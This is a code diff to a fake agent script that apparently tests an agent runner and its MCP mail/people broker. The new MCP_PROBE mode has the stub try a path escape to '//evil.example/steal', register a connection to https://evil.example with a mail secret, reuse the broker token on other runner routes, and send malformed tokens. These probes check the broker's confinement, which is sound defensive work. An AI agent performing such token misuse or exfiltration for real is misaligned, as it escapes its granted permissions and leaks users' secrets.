@@ -14,7 +14,9 @@
 //   REPORT           writes .obi/report.json in the worktree: its arguments, environment, prompt,
 //                    the MCP config it was given (--mcp-config), the tools it was allowed
 //                    (--allowedTools), what each http MCP server answered to `tools/list`, and
-//                    the files in .obi/context/; then ends the turn with "Reported."
+//                    the files in .obi/context/; then ends the turn with "Reported." With
+//                    MCP_CALL, MCP_WRITE, MCP_API or MCP_PROBE it also calls the `oby` broker's
+//                    tools, and MCP_PROBE tries the broker's token on the runner's other routes
 //   anything else    ends the turn with "Nothing to do."
 // It fails the turn when its environment holds a Claude Code, Anthropic or GitHub variable.
 
@@ -135,6 +137,7 @@ async function report(prompt) {
   }
   const answers = {};
   const toolCalls = {};
+  const probes = {};
   for (const [name, server] of Object.entries(mcp?.mcpServers ?? {})) {
     if (server.type !== "http") continue;
     try {
@@ -177,11 +180,39 @@ async function report(prompt) {
           toolCalls[`${name}_api`] = await read.json();
         }
       }
+      if (prompt.includes("MCP_PROBE") && name === "oby") {
+        // More broker calls, then the broker token everywhere else on the runner.
+        const call = async (id, tool, args) => {
+          const answer = await fetch(server.url, {
+            method: "POST",
+            headers: { "content-type": "application/json", accept: "application/json, text/event-stream", ...(server.headers ?? {}) },
+            body: JSON.stringify({ jsonrpc: "2.0", id, method: "tools/call", params: { name: tool, arguments: args } }),
+          });
+          return answer.json();
+        };
+        toolCalls[`${name}_whoami`] = await call(5, "mail_whoami", {});
+        toolCalls[`${name}_draft`] = await call(6, "mail_send_draft", { to: "boss@example.com" });
+        toolCalls[`${name}_away`] = await call(7, "people_get", { path: "/away" });
+        toolCalls[`${name}_escape`] = await call(8, "people_get", { path: "//evil.example/steal" });
+        const base = server.url.slice(0, server.url.indexOf("/v1/agent/"));
+        const auth = server.headers?.Authorization ?? "";
+        const status = async (method, url, headers, body) =>
+          (await fetch(url, { method, headers: { "content-type": "application/json", ...headers }, body })).status;
+        const rpc = JSON.stringify({ jsonrpc: "2.0", id: 9, method: "tools/list", params: {} });
+        probes.jobs = await status("GET", `${base}/v1/jobs`, { Authorization: auth });
+        probes.connections = await status("GET", `${base}/v1/connections`, { Authorization: auth });
+        probes.connect = await status("POST", `${base}/v1/connections`, { Authorization: auth }, JSON.stringify({ name: "evil", api: "https://evil.example", secret: "mail-token" }));
+        probes.appleCheck = await status("POST", `${base}/v1/agent/apple-check`, { Authorization: auth }, "{}");
+        probes.noToken = await status("POST", server.url, {}, rpc);
+        probes.emptyToken = await status("POST", server.url, { Authorization: "Bearer " }, rpc);
+        probes.twoTokens = await status("POST", server.url, { Authorization: `${auth}, ${auth}` }, rpc);
+        probes.ownToken = await status("POST", server.url, { Authorization: auth }, rpc);
+      }
     } catch (e) {
       answers[name] = { error: String(e) };
     }
   }
   const context = existsSync(".obi/context") ? readdirSync(".obi/context").sort() : [];
   mkdirSync(".obi", { recursive: true });
-  writeFileSync(".obi/report.json", JSON.stringify({ argv, env: process.env, prompt, mcp, allowed, answers, toolCalls, context }, null, 2));
+  writeFileSync(".obi/report.json", JSON.stringify({ argv, env: process.env, prompt, mcp, allowed, answers, toolCalls, probes, context }, null, 2));
 }
